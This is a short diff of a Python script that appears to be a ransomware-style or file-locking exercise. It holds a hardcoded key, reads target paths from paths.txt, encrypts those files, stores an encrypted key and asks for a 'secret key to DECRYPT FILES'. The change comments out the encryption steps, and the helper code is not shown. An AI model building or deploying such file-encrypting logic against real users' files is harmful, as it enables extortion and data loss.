@@ -21,18 +21,23 @@ from utils import *
 
 
 # Continue with the rest of your program logic
-
 waitingForKey("start")
+
+
+
 #1
 ascii_key= "vG7pyhyrDzSnqcJ8"
 #generate_key(16)
 
 #2
 file_contains_paths ="paths.txt"
-txtFileCounter = findTxtFile( file_contains_paths )
-print("Files Found: ", txtFileCounter)
+findTxtFile( file_contains_paths )
+
+print("Press Enter To Close...")
+input()
 
 
+'''
 #3
 encrypt_file_paths(ascii_key, file_contains_paths)
 
@@ -59,8 +64,11 @@ saveKey(encoded_encrypted_msg.decode(), "encryptedKey.key")
 waitingForKey(ascii_key, message="Enter the secret key to DECRYPT FILES: ")
 encrypt_file_paths(ascii_key, file_contains_paths)
 
+#10
 
-'''
+
+
+
 #d2=decrypt_data(ascii_key ,encrypted_data )
 #print(encoded_encrypted_msg.decode())
 #print(d)
